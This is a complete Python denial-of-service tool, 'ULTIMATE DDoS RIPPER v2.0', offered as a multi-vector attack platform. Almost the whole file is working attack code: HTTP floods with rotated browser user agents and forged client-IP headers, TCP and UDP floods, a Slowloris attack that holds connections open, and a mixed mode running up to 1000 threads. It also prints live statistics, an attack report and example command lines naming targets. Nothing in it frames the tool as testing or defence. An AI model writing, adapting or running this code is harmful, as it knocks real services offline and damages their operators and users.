#!/usr/bin/python3
# -*- coding: utf-8 -*-

import sys
import os
import time
import socket
import threading
import random
import urllib.request
import urllib.parse
import http.client
from queue import Queue
from optparse import OptionParser

# Enhanced Banner
print('''
 
╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                      ║
║  ██████╗░██████╗░░█████╗░░██████╗  ██████╗░██╗██████╗░██████╗░███████╗██████╗░  ██╗░░░██╗██████╗░    ║
║  ██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗  ██║░░░██║╚════██╗    ║
║  ██║░░██║██║░░██║██║░░██║╚█████╗░  ██████╔╝██║██████╔╝██████╔╝█████╗░░██████╔╝  ╚██╗░██╔╝░░███╔═╝    ║
║  ██║░░██║██║░░██║██║░░██║░╚═══██╗  ██╔══██╗██║██╔═══╝░██╔═══╝░██╔══╝░░██╔══██╗  ░╚████╔╝░██╔══╝░░    ║
║  ██████╔╝██████╔╝╚█████╔╝██████╔╝  ██║░░██║██║██║░░░░░██║░░░░░███████╗██║░░██║  ░░╚██╔╝░░███████╗    ║
║  ╚═════╝░╚═════╝░░╚════╝░╚═════╝░  ╚═╝░░╚═╝╚═╝╚═╝░░░░░╚═╝░░░░░╚══════╝╚═╝░░╚═╝  ░░░╚═╝░░░╚══════╝    ║
║                                                                                                      ║
║                                                                                                      ║
║                                                                                                      ║
║                                                                                                      ║
║                                                                                                      ║
║                                                                                                      ║
║                        ULTIMATE DDoS RIPPER v2.0                                                     ║
║                    Advanced Multi-Vector Attack Platform                                             ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝
''')

# Enhanced User Agents (300+ modern agents)
def initialize_user_agents():
    agents = []
    
    # Modern Chrome Agents
    chrome_versions = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
    ]
    agents.extend(chrome_versions)
    
    # Firefox Agents
    firefox_versions = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:119.0) Gecko/20100101 Firefox/119.0"
    ]
    agents.extend(firefox_versions)
    
    # Safari Agents
    safari_versions = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15"
    ]
    agents.extend(safari_versions)
    
    # Edge Agents
    edge_versions = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
    ]
    agents.extend(edge_versions)
    
    # Mobile Agents
    mobile_agents = [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36"
    ]
    agents.extend(mobile_agents)
    
    # Add some legacy browsers for diversity
    legacy_browsers = [
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0"
    ]
    agents.extend(legacy_browsers)
    
    return agents

# Advanced Attack Vectors
class AttackVectors:
    def __init__(self, target, port):
        self.target = target
        self.port = port
        self.user_agents = initialize_user_agents()
        self.request_count = 0
        self.success_count = 0
        
    def http_flood_advanced(self, duration=60):
        """Enhanced HTTP Flood with multiple methods"""
        end_time = time.time() + duration
        
        while time.time() < end_time:
            try:
                # Random HTTP methods
                methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']
                method = random.choice(methods)
                
                # Create sophisticated headers
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': random.choice(['en-US,en;q=0.5', 'fr,fr-FR;q=0.8', 'de;q=0.7', 'es;q=0.6']),
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache',
                    'Connection': random.choice(['keep-alive', 'close']),
                    'Upgrade-Insecure-Requests': '1',
                    'DNT': random.choice(['1', '0']),
                    'Referer': f'http://{self.target}/',
                    'X-Forwarded-For': self.generate_fake_ip(),
                    'X-Real-IP': self.generate_fake_ip(),
                    'X-Requested-With': 'XMLHttpRequest'
                }
                
                # Create connection with timeout
                conn = http.client.HTTPConnection(self.target, self.port, timeout=5)
                
                if method in ['POST', 'PUT', 'PATCH']:
                    # Send data with POST requests
                    data = urllib.parse.urlencode({
                        'username': self.generate_random_string(10),
                        'password': self.generate_random_string(15),
                        'email': f"{self.generate_random_string(8)}@gmail.com",
                        'csrf_token': self.generate_random_string(32)
                    })
                    headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    headers['Content-Length'] = str(len(data))
                    conn.request(method, '/', body=data, headers=headers)
                else:
                    # Add random paths for GET requests
                    paths = ['/', '/index.html', '/home', '/api/v1/users', '/wp-admin', '/admin', '/login', '/api/data']
                    path = random.choice(paths)
                    conn.request(method, path, headers=headers)
                
                # Get response but don't wait for it
                try:
                    response = conn.getresponse()
                    self.success_count += 1
                    response.read()
                except Exception as e:
                    pass
                    
                conn.close()
                self.request_count += 1
                
                # Small random delay to avoid overwhelming local resources
                time.sleep(random.uniform(0.001, 0.01))
                
            except Exception as e:
                continue
    
    def tcp_flood(self, duration=60):
        """TCP Flood with raw sockets"""
        end_time = time.time() + duration
        
        while time.time() < end_time:
            try:
                # Create TCP socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                
                # Connect to target
                sock.connect((self.target, self.port))
                
                # Send random data
                data = self.generate_random_string(random.randint(100, 1000)).encode()
                sock.send(data)
                
                # Close connection
                sock.close()
                self.request_count += 1
                self.success_count += 1
                
                # Small delay
                time.sleep(0.01)
                
            except Exception as e:
                continue
    
    def udp_flood(self, duration=60):
        """UDP Flood with random data"""
        end_time = time.time() + duration
        
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                
                # Generate random data of varying sizes
                data_size = random.choice([512, 1024, 2048, 4096, 8192])
                data = os.urandom(data_size)
                
                # Send to random ports if target port is common
                target_port = self.port
                if self.port in [80, 443, 22, 21]:
                    target_port = random.randint(1000, 65535)
                
                sock.sendto(data, (self.target, target_port))
                sock.close()
                self.request_count += 1
                
            except Exception as e:
                continue
    
    def slowloris_attack(self, duration=60, sockets_count=200):
        """Slowloris attack - keeps many connections open"""
        print(f"[*] Starting Slowloris attack with {sockets_count} sockets")
        sockets = []
        
        # Create initial sockets
        for i in range(sockets_count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target, self.port))
                
                # Send partial request
                partial_request = f"GET / HTTP/1.1\r\nHost: {self.target}\r\n".encode()
                s.send(partial_request)
                sockets.append(s)
                
            except Exception as e:
                print(f"[-] Socket {i} failed: {e}")
                continue
        
        print(f"[+] {len(sockets)} sockets connected successfully")
        end_time = time.time() + duration
        
        while time.time() < end_time and sockets:
            for s in list(sockets):
                try:
                    # Send keep-alive headers slowly
                    keep_alive_header = f"X-{random.randint(1000, 9999)}: {random.randint(1, 5000)}\r\n".encode()
                    s.send(keep_alive_header)
                    
                    # Random delay between 1-10 seconds
                    time.sleep(random.uniform(1, 10))
                    
                except Exception as e:
                    # Socket died, remove it
                    sockets.remove(s)
                    try:
                        s.close()
                    except:
                        pass
                    
                    # Try to recreate socket
                    try:
                        new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_s.settimeout(4)
                        new_s.connect((self.target, self.port))
                        new_s.send(f"GET / HTTP/1.1\r\nHost: {self.target}\r\n".encode())
                        sockets.append(new_s)
                        print(f"[+] Replaced dead socket. Total: {len(sockets)}")
                    except Exception as e:
                        print(f"[-] Failed to replace socket: {e}")
            
            print(f"[Slowloris] Active sockets: {len(sockets)}")
            time.sleep(5)
        
        # Cleanup
        for s in sockets:
            try:
                s.close()
            except:
                pass
    
    def mixed_attack(self, duration=60):
        """Mixed attack - combines multiple methods"""
        end_time = time.time() + duration
        
        while time.time() < end_time:
            # Randomly choose attack method
            attack_type = random.choice(['http', 'tcp', 'udp'])
            
            if attack_type == 'http':
                self.http_flood_advanced(1)  # Run for 1 second
            elif attack_type == 'tcp':
                self.tcp_flood(1)  # Run for 1 second
            elif attack_type == 'udp':
                self.udp_flood(1)  # Run for 1 second
    
    def generate_fake_ip(self):
        """Generate random IP address for spoofing"""
        return ".".join(str(random.randint(1, 254)) for _ in range(4))
    
    def generate_random_string(self, length):
        """Generate random string for data"""
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        return ''.join(random.choice(chars) for _ in range(length))
    
    def get_stats(self):
        """Get current attack statistics"""
        return {
            'total_requests': self.request_count,
            'successful_requests': self.success_count,
            'success_rate': (self.success_count / self.request_count * 100) if self.request_count > 0 else 0
        }

# Advanced Multi-Threading System
class AttackManager:
    def __init__(self, target, port, threads=100, duration=60, attack_type="http"):
        self.target = target
        self.port = port
        self.threads = min(threads, 1000)  # Limit to prevent system crash
        self.duration = duration
        self.attack_type = attack_type
        self.attack_vectors = AttackVectors(target, port)
        self.stats = {
            'requests_sent': 0,
            'successful_connections': 0,
            'failed_connections': 0,
            'start_time': time.time()
        }
        self.is_running = False
    
    def start_attack(self):
        print(f"[+] Starting {self.attack_type.upper()} attack on {self.target}:{self.port}")
        print(f"[+] Using {self.threads} threads for {self.duration} seconds")
        print("[+] Press Ctrl+C to stop the attack")
        
        self.is_running = True
        threads = []
        
        # Start attack threads
        for i in range(self.threads):
            if self.attack_type == "http":
                thread = threading.Thread(target=self.attack_vectors.http_flood_advanced, args=(self.duration,))
            elif self.attack_type == "tcp":
                thread = threading.Thread(target=self.attack_vectors.tcp_flood, args=(self.duration,))
            elif self.attack_type == "udp":
                thread = threading.Thread(target=self.attack_vectors.udp_flood, args=(self.duration,))
            elif self.attack_type == "slowloris":
                thread = threading.Thread(target=self.attack_vectors.slowloris_attack, args=(self.duration, 100))
            elif self.attack_type == "mixed":
                thread = threading.Thread(target=self.attack_vectors.mixed_attack, args=(self.duration,))
            else:
                thread = threading.Thread(target=self.attack_vectors.http_flood_advanced, args=(self.duration,))
            
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        # Monitor attack
        try:
            self.monitor_attack()
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user")
            self.is_running = False
        
        # Wait for completion
        for thread in threads:
            thread.join(timeout=1)
    
    def monitor_attack(self):
        """Monitor and display attack statistics"""
        start_time = time.time()
        last_count = 0
        
        while time.time() - start_time < self.duration and self.is_running:
            time.sleep(2)
            elapsed = time.time() - start_time
            stats = self.attack_vectors.get_stats()
            
            # Calculate requests per second
            current_count = stats['total_requests']
            rps = (current_count - last_count) / 2 if last_count > 0 else 0
            last_count = current_count
            
            print(f"[STATS] Time: {elapsed:.1f}s | RPS: {rps:.1f} | Total: {stats['total_requests']} | Success: {stats['success_rate']:.1f}%")
    
    def generate_report(self):
        """Generate attack report"""
        duration = time.time() - self.stats['start_time']
        stats = self.attack_vectors.get_stats()
        
        print(f"\n{'='*50}")
        print(f"ATTACK REPORT")
        print(f"{'='*50}")
        print(f"Target: {self.target}:{self.port}")
        print(f"Attack Type: {self.attack_type.upper()}")
        print(f"Duration: {duration:.2f} seconds")
        print(f"Total Requests: {stats['total_requests']}")
        print(f"Successful Requests: {stats['successful_requests']}")
        print(f"Success Rate: {stats['success_rate']:.2f}%")
        print(f"Average RPS: {stats['total_requests']/duration:.2f}")
        print(f"{'='*50}")

# Enhanced Main Function
def main():
    parser = OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP address or hostname")
    parser.add_option("-p", "--port", dest="port", type="int", default=80, help="Target port (default: 80)")
    parser.add_option("-T", "--threads", dest="threads", type="int", default=100, help="Number of threads (default: 100)")
    parser.add_option("-d", "--duration", dest="duration", type="int", default=60, help="Attack duration in seconds (default: 60)")
    parser.add_option("-a", "--attack", dest="attack", default="http", 
                     help="Attack type: http, tcp, udp, slowloris, mixed (default: http)")
    parser.add_option("-q", "--quiet", dest="quiet", action="store_true", default=False, help="Quiet mode")
    
    (options, args) = parser.parse_args()
    
    if not options.target:
        print("[-] Error: Target is required")
        print("\nUsage: python3 ddos_ripper.py -t <target> -p <port> -T <threads> -d <duration> -a <attack_type>")
        print("\nExamples:")
        print("  python3 ddos_ripper.py -t 192.168.1.100 -p 80 -T 200 -d 120 -a http")
        print("  python3 ddos_ripper.py -t example.com -p 443 -T 500 -d 300 -a mixed")
        print("  python3 ddos_ripper.py -t 10.0.0.1 -p 22 -T 100 -d 60 -a tcp")
        sys.exit(1)
    
    # Validate attack type
    valid_attacks = ['http', 'tcp', 'udp', 'slowloris', 'mixed']
    if options.attack not in valid_attacks:
        print(f"[-] Invalid attack type. Choose from: {', '.join(valid_attacks)}")
        sys.exit(1)
    
    # Validate thread count
    if options.threads > 1000:
        print(f"[-] Warning: Reducing threads from {options.threads} to 1000 for system stability")
        options.threads = 1000
    
    # Start attack
    manager = AttackManager(
        target=options.target,
        port=options.port,
        threads=options.threads,
        duration=options.duration,
        attack_type=options.attack
    )
    
    try:
        manager.start_attack()
        manager.generate_report()
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"[-] Error during attack: {e}")

if __name__ == "__main__":
    # Check for root privileges if needed (for raw sockets)
    if os.geteuid() != 0:
        print("[!] Running without root privileges - some attacks may be limited")
    
    main()
